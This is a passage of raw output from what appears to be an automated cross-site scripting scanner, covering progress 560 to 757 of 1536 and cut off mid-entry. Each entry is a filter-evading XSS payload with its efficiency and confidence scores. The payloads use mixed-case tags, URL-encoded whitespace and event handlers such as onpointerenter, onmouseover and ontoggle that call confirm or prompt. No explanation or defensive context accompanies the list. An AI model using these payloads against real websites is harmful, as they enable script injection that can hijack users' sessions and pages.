 Payload: <D3v%0dONPOIntEreNtER%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 560/1536 ------------------------------------------------------------
 Payload: <htML%0aONpoINtERENTeR+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 561/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONmOUsEOvEr%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 562/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnmOuSEOvEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 563/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNPOInteReNTEr+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 564/1536 ------------------------------------------------------------
 Payload: <DetAiLS%09onpOINTEreNtEr%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 565/1536 ------------------------------------------------------------
 Payload: <D3v/+/oNpoiNtErENTer%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 566/1536 ------------------------------------------------------------
 Payload: <d3V%0aonMoUSEOveR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 567/1536 ------------------------------------------------------------
 Payload: <Html%09onpoINtErENtEr+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 568/1536 ------------------------------------------------------------
 Payload: <DETaIls%0dOntoGgLE%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 569/1536 ------------------------------------------------------------
 Payload: <d3V%0doNMOUseOVeR%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 570/1536 ------------------------------------------------------------
 Payload: <d3V%0aONmOusEOVeR%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 571/1536 ------------------------------------------------------------
 Payload: <A%0aOnMousEOVER%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 572/1536 ------------------------------------------------------------
 Payload: <DeTAilS%09OnPOiNTereNteR+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 573/1536 ------------------------------------------------------------
 Payload: <a%0doNpOinTEReNtEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 574/1536 ------------------------------------------------------------
 Payload: <d3v%09oNpOinteReNtER%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 575/1536 ------------------------------------------------------------
 Payload: <D3v%09oNPOiNteRentER%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 576/1536  Progress: 577/1536 ------------------------------------------------------------
 Payload: <D3v%09oNPoINtereNTEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 578/1536 ------------------------------------------------------------
 Payload: <D3V%0donmOUseovER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 579/1536 ------------------------------------------------------------
 Payload: <d3V%09OnMouSEOVer+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 580/1536 ------------------------------------------------------------
 Payload: <d3V%09onPoInTEReNtER+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 581/1536 ------------------------------------------------------------
 Payload: <a%0aONPoiNTErentER+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 582/1536 ------------------------------------------------------------
 Payload: <HTml%0aOnMouSeoVER%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 583/1536 ------------------------------------------------------------
 Payload: <a%09OnMOUSeover%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 584/1536 ------------------------------------------------------------
 Payload: <A%0aonPointEREnteR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 585/1536  Progress: 586/1536 ------------------------------------------------------------
 Payload: <dETails%09OnTOggLE%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 587/1536  Progress: 588/1536 ------------------------------------------------------------
 Payload: <A%09ONmouSEOveR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 589/1536  Progress: 590/1536 ------------------------------------------------------------
 Payload: <A%09OnPoinTerENTER+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 591/1536 ------------------------------------------------------------
 Payload: <A/+/ONpOInterEnter%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 592/1536 ------------------------------------------------------------
 Payload: <A%09oNmOuSEOvEr%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 593/1536 ------------------------------------------------------------
 Payload: <A/+/ONpOiNteRENter%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 594/1536  Progress: 595/1536 ------------------------------------------------------------
 Payload: <dETAils%0dOnPoinTeRenTEr+=+(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 596/1536 ------------------------------------------------------------
 Payload: <dETails/+/onPoInTeRentEr%0a=%0aa=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 597/1536 ------------------------------------------------------------
 Payload: <a/+/OnpoiNterenTeR%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 598/1536 ------------------------------------------------------------
 Payload: <DetailS%0aoNPoInterENter%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 599/1536 ------------------------------------------------------------
 Payload: <a%0aONMoUSEoVeR%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 600/1536  Progress: 601/1536 ------------------------------------------------------------
 Payload: <a%0doNMouseOvEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 602/1536 ------------------------------------------------------------
 Payload: <D3v/+/onPOInTErEntEr+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 603/1536 ------------------------------------------------------------
 Payload: <d3V%09oNmouseoVeR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 604/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNmOuSeoVEr%09=%09(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 605/1536  Progress: 606/1536 ------------------------------------------------------------
 Payload: <Details%0aontoGglE%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 607/1536 ------------------------------------------------------------
 Payload: <HtMl/+/OnmOUseOvER%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 608/1536 ------------------------------------------------------------
 Payload: <A/+/ONPoIntEReNTer%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 609/1536 ------------------------------------------------------------
 Payload: <a%09ONmOuSeoVER%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 610/1536 ------------------------------------------------------------
 Payload: <a/+/onpOInTereNTer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 611/1536 ------------------------------------------------------------
 Payload: <DeTaILs/+/OnPOINTERenTeR+=+a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 612/1536 ------------------------------------------------------------
 Payload: <a/+/ONMOUSEOVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 613/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnpoiNTereNteR%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 614/1536 ------------------------------------------------------------
 Payload: <detaiLS%0aontOGGlE%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 615/1536  Progress: 616/1536 ------------------------------------------------------------
 Payload: <html%09ONMoUsEOVER%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 617/1536  Progress: 618/1536 ------------------------------------------------------------
 Payload: <htMl%0aOnpoINteRenTeR%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 619/1536 ------------------------------------------------------------
 Payload: <d3V%09onmouSEOveR%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 620/1536 ------------------------------------------------------------
 Payload: <d3V/+/OnmOuSeover%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 621/1536  Progress: 622/1536 ------------------------------------------------------------
 Payload: <dEtaIls%09oNtOGGle%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 623/1536 ------------------------------------------------------------
 Payload: <dETAiLs/+/OnPoiNteREnTeR+=+confirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 624/1536  Progress: 625/1536 ------------------------------------------------------------
 Payload: <htmL%0aOnpoINTeRenteR%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 626/1536 ------------------------------------------------------------
 Payload: <A/+/ONmOuSEover+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 627/1536 ------------------------------------------------------------
 Payload: <Html/+/onpOiNTEreNteR%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 628/1536  Progress: 629/1536 ------------------------------------------------------------
 Payload: <a%0aOnpoinTEREnter+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 630/1536 ------------------------------------------------------------
 Payload: <a/+/ONMOuSeOVer+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 631/1536 ------------------------------------------------------------
 Payload: <D3v%0aONMOusEOvER%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 632/1536 ------------------------------------------------------------
 Payload: <A%0aonPoINTERenTer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 633/1536 ------------------------------------------------------------
 Payload: <deTaIlS%0doNpOintEREntEr%0d=%0d(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 634/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnpoiNTErEntEr+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 635/1536 ------------------------------------------------------------
 Payload: <hTmL%09ONpoiNTErenTER%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 636/1536  Progress: 637/1536 ------------------------------------------------------------
 Payload: <a%09onMoUSeoVEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 638/1536 ------------------------------------------------------------
 Payload: <d3v%0aOnpOiNTerENTeR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 639/1536 ------------------------------------------------------------
 Payload: <d3v%0dONmOUseOver%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 640/1536 ------------------------------------------------------------
 Payload: <A%0dOnpOInTeRenter%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 641/1536 ------------------------------------------------------------
 Payload: <hTml%0donpOiNtereNtER%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 642/1536 ------------------------------------------------------------
 Payload: <d3v%09onMousEoVER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 643/1536 ------------------------------------------------------------
 Payload: <A%09ONMoUseOVeR%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 644/1536 ------------------------------------------------------------
 Payload: <a%09ONPoinTerENTEr%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 645/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONMOUseoVer+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 646/1536 ------------------------------------------------------------
 Payload: <A%0donPoiNtErENtER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 647/1536  Progress: 648/1536 ------------------------------------------------------------
 Payload: <hTmL%09OnmoUsEoVEr%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 649/1536 ------------------------------------------------------------
 Payload: <D3v%09oNmOuSeoVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 650/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNMOUSeoVer%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 651/1536 ------------------------------------------------------------
 Payload: <a%0aOnpoiNtErENter%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 652/1536  Progress: 653/1536  Progress: 654/1536 ------------------------------------------------------------
 Payload: <DETAIls%09onPoIntErenTeR%09=%09a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 655/1536 ------------------------------------------------------------
 Payload: <detaIlS%0dONPOInTeRentER%09=%09[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 656/1536 ------------------------------------------------------------
 Payload: <htmL%0dOnPoiNTereNTEr%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 657/1536 ------------------------------------------------------------
 Payload: <HtMl%0aOnPOINTErEnTEr%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 658/1536 ------------------------------------------------------------
 Payload: <DEtaIls%0donPOinTERentEr+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 659/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONpoinTeREntER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 660/1536 ------------------------------------------------------------
 Payload: <a/+/onpOINtErenTer%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 661/1536 ------------------------------------------------------------
 Payload: <a/+/OnPointEREnter%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 662/1536  Progress: 663/1536 ------------------------------------------------------------
 Payload: <DetAIls/+/onpoiNTeReNTer+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 664/1536 ------------------------------------------------------------
 Payload: <DeTaILs%0aoNPOIntErEntER%0d=%0d[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 665/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnMOUseOvER%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 666/1536 ------------------------------------------------------------
 Payload: <deTAIls/+/ONTogGLe+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 667/1536  Progress: 668/1536 ------------------------------------------------------------
 Payload: <detaIls%09OnTOggLe%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 669/1536 ------------------------------------------------------------
 Payload: <DEtAils%0aonpointErenter+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 670/1536 ------------------------------------------------------------
 Payload: <A%09onPoInTereNTer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 671/1536 ------------------------------------------------------------
 Payload: <DEtaIls/+/OnPointeREntER%09=%09confirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 672/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnMOuSeoVeR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 673/1536 ------------------------------------------------------------
 Payload: <a%0aoNpOintErENter+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 674/1536 ------------------------------------------------------------
 Payload: <dETaILS/+/OnpoINTERenTER%09=%09a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 675/1536  Progress: 676/1536 ------------------------------------------------------------
 Payload: <deTAIls%09onpoInTereNtER%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 677/1536 ------------------------------------------------------------
 Payload: <d3V%0donpointeReNTEr%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 678/1536  Progress: 679/1536 ------------------------------------------------------------
 Payload: <DeTAILs%09onToggle%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 680/1536 ------------------------------------------------------------
 Payload: <deTaILs%09ONpOINtErenter%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 681/1536 ------------------------------------------------------------
 Payload: <dETAiLs/+/OnTOgGle%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 682/1536 ------------------------------------------------------------
 Payload: <dETaIls/+/oNToggLe+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 683/1536 ------------------------------------------------------------
 Payload: <D3v%09onMOuseOVER%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 684/1536 ------------------------------------------------------------
 Payload: <hTmL%09onPoInTerENtER+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 685/1536 ------------------------------------------------------------
 Payload: <d3V%0aONpOIntereNtER%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 686/1536 ------------------------------------------------------------
 Payload: <A/+/ONpOinTErenTer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 687/1536 ------------------------------------------------------------
 Payload: <d3V/+/onpOiNterEnTEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 688/1536 ------------------------------------------------------------
 Payload: <htMl/+/oNmouSEover+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 689/1536 ------------------------------------------------------------
 Payload: <DETails%0doNpoIntERenTER%09=%09[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 690/1536 ------------------------------------------------------------
 Payload: <Html%09ONpoInTERenTer%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 691/1536 ------------------------------------------------------------
 Payload: <DEtaIls%09ONPOintEReNter%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 692/1536 ------------------------------------------------------------
 Payload: <htML%09onMOusEOVer%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 693/1536 ------------------------------------------------------------
 Payload: <HTML/+/onpoInterEnTER%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 694/1536 ------------------------------------------------------------
 Payload: <d3V%0aONMOUSEovEr%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 695/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnPoiNteREnTEr%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 696/1536 ------------------------------------------------------------
 Payload: <deTailS/+/onTOgGLE%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 697/1536 ------------------------------------------------------------
 Payload: <a%0dONPOINteREnter%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 698/1536 ------------------------------------------------------------
 Payload: <a%0aonMousEoVER%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 699/1536 ------------------------------------------------------------
 Payload: <html/+/ONPoINTERENtER+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 700/1536 ------------------------------------------------------------
 Payload: <DEtAiLS%09OnPoINTEREnTEr%09=%09[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 701/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNmousEOVER+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 702/1536 ------------------------------------------------------------
 Payload: <dETaILS/+/oNPOintERenTER%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 703/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONmoUSeoVER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 704/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnPOINTErENter+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 705/1536 ------------------------------------------------------------
 Payload: <A/+/OnpoINTerENTEr%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 706/1536 ------------------------------------------------------------
 Payload: <D3v%0dOnPOiNtErenTER+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 707/1536 ------------------------------------------------------------
 Payload: <HtmL%0aoNPOinTEreNTeR%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 708/1536 ------------------------------------------------------------
 Payload: <A%0aONmoUSeOvER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 709/1536 ------------------------------------------------------------
 Payload: <deTAIls%09onpOiNTEREnTer+=+[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 710/1536 ------------------------------------------------------------
 Payload: <a%0aonPoinTEReNtEr%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 711/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnMOuSEoVER+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 712/1536 ------------------------------------------------------------
 Payload: <d3V%0aONpoInteReNTER%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 713/1536  Progress: 714/1536 ------------------------------------------------------------
 Payload: <A%0aONmoUseoveR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 715/1536 ------------------------------------------------------------
 Payload: <d3V/+/onMOuSEoVEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 716/1536 ------------------------------------------------------------
 Payload: <a%0aonpoiNTErENTEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 717/1536  Progress: 718/1536 ------------------------------------------------------------
 Payload: <Details%0dOnpoiNteRenter%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 719/1536 ------------------------------------------------------------
 Payload: <A/+/onpoInTereNTER%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 720/1536 ------------------------------------------------------------
 Payload: <d3V%0aonPoiNtEREntER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 721/1536  Progress: 722/1536 ------------------------------------------------------------
 Payload: <D3v%09oNPOINTeRENtER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 723/1536 ------------------------------------------------------------
 Payload: <d3V%0doNmouseoVer%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 724/1536 ------------------------------------------------------------
 Payload: <DEtAIls%0doNpOINTERentEr+=+(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 725/1536 ------------------------------------------------------------
 Payload: <html%09ONPOInTerenTEr%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 726/1536  Progress: 727/1536 ------------------------------------------------------------
 Payload: <d3v%0aonPoIntEReNTer%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 728/1536 ------------------------------------------------------------
 Payload: <d3V%0doNPOiNTereNter%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 729/1536 ------------------------------------------------------------
 Payload: <DetaIls%0aONToGgle+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 730/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnmoUSEOveR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 731/1536 ------------------------------------------------------------
 Payload: <A%09ONMouSeOVer%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 732/1536 ------------------------------------------------------------
 Payload: <DeTAILs%0dOnpointErenter+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 733/1536 ------------------------------------------------------------
 Payload: <D3v%09OnMOuSEOVEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 734/1536 ------------------------------------------------------------
 Payload: <html/+/oNPoInTerEnTEr%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 735/1536 ------------------------------------------------------------
 Payload: <A%0aOnmouseoveR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 736/1536 ------------------------------------------------------------
 Payload: <a/+/ONPoINTEREntER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 737/1536 ------------------------------------------------------------
 Payload: <d3V/+/onpOiNTereNtER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 738/1536 ------------------------------------------------------------
 Payload: <htmL%09ONpoiNTerEntER%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 739/1536 ------------------------------------------------------------
 Payload: <DETaIlS%0dONtOgGle%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 740/1536 ------------------------------------------------------------
 Payload: <A%0aoNMOuSEOvER%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 741/1536 ------------------------------------------------------------
 Payload: <dETAILs/+/ONpOiNtErenTER%0a=%0a(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 742/1536 ------------------------------------------------------------
 Payload: <HtML%0aoNPoiNTeRenTER%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 743/1536  Progress: 744/1536 ------------------------------------------------------------
 Payload: <dEtailS%0aONtOgGLE%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 745/1536 ------------------------------------------------------------
 Payload: <detaIls/+/onpoINterENTER%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 746/1536 ------------------------------------------------------------
 Payload: <deTailS%0doNPoiNTErEnTER%09=%09(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 747/1536  Progress: 748/1536 ------------------------------------------------------------
 Payload: <HtmL%0aonPoinTeRenteR%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 749/1536 ------------------------------------------------------------
 Payload: <a/+/onMousEOVEr%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 750/1536 ------------------------------------------------------------
 Payload: <DEtaIlS%0aONpoINTerentEr+=+(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 751/1536 ------------------------------------------------------------
 Payload: <d3v%0dONPOinTERentEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 752/1536 ------------------------------------------------------------
 Payload: <a%09oNmousEoVer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 753/1536 ------------------------------------------------------------
 Payload: <dETAiLs/+/ONpOintERenTeR%0a=%0a(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 754/1536 ------------------------------------------------------------
 Payload: <Html/+/onMOUseover%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 755/1536 ------------------------------------------------------------
 Payload: <d3V%0dONpoInTereNTEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 756/1536 ------------------------------------------------------------
 Payload: <HTmL%0aOnpoInteReNtER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 757/1536 ------------------------------------------------------------
 Payload: <DetAILS%09oNpointerenTER%0d=%0d(prompt)``// 
